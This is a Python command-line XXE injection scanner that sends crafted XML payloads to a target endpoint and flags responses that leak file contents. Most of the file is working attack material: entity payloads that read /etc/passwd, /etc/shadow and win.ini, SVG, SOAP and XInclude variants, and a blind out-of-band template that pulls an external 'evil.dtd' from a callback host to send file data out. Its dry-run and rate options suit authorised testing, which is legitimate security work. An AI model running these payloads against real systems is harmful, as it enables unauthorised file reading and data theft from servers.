#!/usr/bin/env python3
"""
xxe_scanner.py — XXE (XML External Entity) injection scanner.

Tests classic XXE, blind OOB XXE, parameter entity injection, SVG XXE,
and content-type switching (JSON → XML).

Usage:
  python3 tools/xxe_scanner.py --url https://api.example.com/upload
  python3 tools/xxe_scanner.py --url https://api.example.com/upload --callback http://your.burp.collab
  python3 tools/xxe_scanner.py --url https://api.example.com/upload --dry-run
  python3 tools/xxe_scanner.py --url https://api.example.com/upload --rate 0.5 --json
"""

import argparse
import json
import time
import urllib.request
import urllib.error

# ─── Color codes ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

FINDINGS = []

# ─── Payloads ─────────────────────────────────────────────────────────────────

CLASSIC_FILE_PAYLOADS = [
    ("etc-passwd", "/etc/passwd"),
    ("etc-hostname", "/etc/hostname"),
    ("etc-shadow-attempt", "/etc/shadow"),
    ("win-ini", "c:/windows/win.ini"),
    ("hosts", "/etc/hosts"),
]

CLASSIC_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{uri}">
]>
<root><data>&xxe;</data></root>"""

PARAMETER_ENTITY_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{uri}">
  %xxe;
]>
<root><data>test</data></root>"""

OOB_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{callback}/xxe-oob?data=test">
  %xxe;
]>
<root><data>test</data></root>"""

OOB_FILE_EXFIL = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "{callback}/evil.dtd">
  %dtd;
]>
<root><data>&send;</data></root>"""

SVG_XXE = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""

XINCLUDE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>"""

SOAP_XXE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body><data>&xxe;</data></soapenv:Body>
</soapenv:Envelope>"""

# ─── HTTP Helpers ─────────────────────────────────────────────────────────────

def http_post(url: str, body: str, content_type: str, timeout: int = 10) -> tuple[int, str]:
    data = body.encode()
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0",
            "Accept": "*/*",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, str(e)


def record(test: str, result: str, detail: str, severity: str = "HIGH"):
    FINDINGS.append({"test": test, "result": result, "detail": detail, "severity": severity})
    color = RED if result == "VULNERABLE" else (YELLOW if result == "INTERESTING" else GREEN)
    print(f"  {color}[{result}]{RESET} {test}")
    if detail:
        print(f"    {DIM}{detail}{RESET}")


def check_response_for_xxe(body: str) -> bool:
    """Heuristic: response contains /etc/passwd content or file markers."""
    indicators = ["root:x:", "bin:x:", "daemon:", "[boot loader]", "windows", "hostname"]
    return any(ind in body.lower() for ind in indicators)


# ─── Test Cases ───────────────────────────────────────────────────────────────

def test_classic_xxe(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[1] Classic XXE — File Read{RESET}")
    for name, file_path in CLASSIC_FILE_PAYLOADS:
        uri = f"file://{file_path}"
        payload = CLASSIC_TEMPLATE.format(uri=uri)
        print(f"  {DIM}Payload ({name}): file://{file_path}{RESET}")
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} Would POST to {url}")
            print(f"    Body:\n{DIM}{payload[:200]}...{RESET}")
            continue
        time.sleep(1.0 / rate)
        status, body = http_post(url, payload, "application/xml")
        if check_response_for_xxe(body):
            record(f"classic-xxe-{name}", "VULNERABLE",
                   f"file://{file_path} reflected → HTTP {status}")
        elif status in (200, 201):
            record(f"classic-xxe-{name}", "INTERESTING",
                   f"HTTP {status} — manual review required")
        else:
            record(f"classic-xxe-{name}", "BLOCKED", f"HTTP {status}")


def test_parameter_entity(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[2] Parameter Entity Injection{RESET}")
    for name, file_path in [("etc-passwd", "/etc/passwd"), ("etc-hostname", "/etc/hostname")]:
        payload = PARAMETER_ENTITY_TEMPLATE.format(uri=f"file://{file_path}")
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} Would POST parameter entity payload for {file_path}")
            print(f"    {DIM}{payload[:150]}...{RESET}")
            continue
        time.sleep(1.0 / rate)
        status, body = http_post(url, payload, "application/xml")
        marker = "VULNERABLE" if check_response_for_xxe(body) else (
            "INTERESTING" if status in (200, 201) else "BLOCKED"
        )
        record(f"param-entity-{name}", marker, f"HTTP {status}")


def test_oob_xxe(url: str, callback: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[3] Blind / OOB XXE{RESET}")
    if not callback:
        print(f"  {DIM}Skipped — use --callback <url> to enable OOB tests{RESET}")
        return

    payload_oob = OOB_TEMPLATE.format(callback=callback)
    payload_exfil = OOB_FILE_EXFIL.format(callback=callback)

    for name, payload, desc in [
        ("oob-probe", payload_oob, "OOB DNS/HTTP callback"),
        ("oob-exfil", payload_exfil, "OOB file exfiltration via DTD"),
    ]:
        print(f"  {DIM}{desc}: {callback}{RESET}")
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} Would POST OOB payload:")
            print(f"    {DIM}{payload[:200]}...{RESET}")
            continue
        time.sleep(1.0 / rate)
        status, body = http_post(url, payload, "application/xml")
        record(name, "INTERESTING",
               f"HTTP {status} — check {callback} for callback (blind OOB)")


def test_svg_xxe(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[4] SVG XXE Upload{RESET}")
    if dry_run:
        print(f"  {CYAN}[DRY-RUN]{RESET} Would POST SVG payload:")
        print(f"    {DIM}{SVG_XXE[:200]}...{RESET}")
        return
    time.sleep(1.0 / rate)
    for ct in ("image/svg+xml", "application/xml", "text/xml"):
        status, body = http_post(url, SVG_XXE, ct)
        if check_response_for_xxe(body):
            record("svg-xxe", "VULNERABLE", f"content-type={ct} → /etc/passwd reflected, HTTP {status}")
            return
        elif status in (200, 201):
            record("svg-xxe", "INTERESTING", f"content-type={ct} → HTTP {status}")
            return
    record("svg-xxe", "BLOCKED", "All content-types rejected")


def test_xinclude(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[5] XInclude Injection{RESET}")
    if dry_run:
        print(f"  {CYAN}[DRY-RUN]{RESET} Would POST XInclude payload:")
        print(f"    {DIM}{XINCLUDE_PAYLOAD[:200]}...{RESET}")
        return
    time.sleep(1.0 / rate)
    status, body = http_post(url, XINCLUDE_PAYLOAD, "application/xml")
    marker = "VULNERABLE" if check_response_for_xxe(body) else (
        "INTERESTING" if status in (200, 201) else "BLOCKED"
    )
    record("xinclude", marker, f"HTTP {status}")


def test_content_type_switch(url: str, rate: float, dry_run: bool):
    print(f"\n{BOLD}[6] Content-Type Switch (JSON → XML){RESET}")
    # If server accepts JSON, try sending XML body with XML content-type
    json_body = '{"name": "test", "data": "<foo>&xxe;</foo>"}'
    xml_body = CLASSIC_TEMPLATE.format(uri="file:///etc/passwd")

    combos = [
        ("xml-as-text-xml", xml_body, "text/xml"),
        ("xml-as-appxml", xml_body, "application/xml"),
        ("xxe-in-json-value", json_body, "application/json"),
        ("soap-xxe", SOAP_XXE, "text/xml; charset=utf-8"),
    ]
    for name, body, ct in combos:
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} Would POST with Content-Type: {ct}")
            continue
        time.sleep(1.0 / rate)
        status, resp = http_post(url, body, ct)
        marker = "VULNERABLE" if check_response_for_xxe(resp) else (
            "INTERESTING" if status in (200, 201) else "BLOCKED"
        )
        record(f"ct-switch-{name}", marker, f"Content-Type={ct} → HTTP {status}")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="XXE injection scanner")
    parser.add_argument("--url",       required=True, help="Target endpoint URL")
    parser.add_argument("--callback",  default="", metavar="URL",
                        help="OOB callback URL (Burp Collaborator, interactsh, etc.)")
    parser.add_argument("--rate",      type=float, default=1.0, metavar="REQ/S",
                        help="Request rate limit in req/sec (default: 1.0)")
    parser.add_argument("--dry-run",   action="store_true",
                        help="Show payloads without sending requests")
    parser.add_argument("--json",      action="store_true", dest="json_output",
                        help="Output results as JSON")
    args = parser.parse_args()

    print(f"\n{BOLD}{BLUE}╔══════════════════════════════════════╗")
    print(f"║         XXE Scanner                  ║")
    print(f"╚══════════════════════════════════════╝{RESET}")
    print(f"  Target   : {CYAN}{args.url}{RESET}")
    print(f"  Callback : {args.callback or '(not set)'}")
    print(f"  Rate     : {args.rate} req/sec")
    if args.dry_run:
        print(f"  Mode     : {YELLOW}DRY-RUN (no requests sent){RESET}")

    test_classic_xxe(args.url, args.rate, args.dry_run)
    test_parameter_entity(args.url, args.rate, args.dry_run)
    test_oob_xxe(args.url, args.callback, args.rate, args.dry_run)
    test_svg_xxe(args.url, args.rate, args.dry_run)
    test_xinclude(args.url, args.rate, args.dry_run)
    test_content_type_switch(args.url, args.rate, args.dry_run)

    vulns = [f for f in FINDINGS if f["result"] == "VULNERABLE"]
    interesting = [f for f in FINDINGS if f["result"] == "INTERESTING"]
    print(f"\n{BOLD}{'─'*50}{RESET}")
    print(f"  Tests run   : {len(FINDINGS)}")
    if vulns:
        print(f"  {RED}Vulnerable  : {len(vulns)}{RESET}")
    else:
        print(f"  {GREEN}Vulnerable  : 0{RESET}")
    if interesting:
        print(f"  {YELLOW}Interesting : {len(interesting)}{RESET}")

    if args.json_output:
        print(json.dumps({"url": args.url, "findings": FINDINGS}, indent=2))


if __name__ == "__main__":
    main()
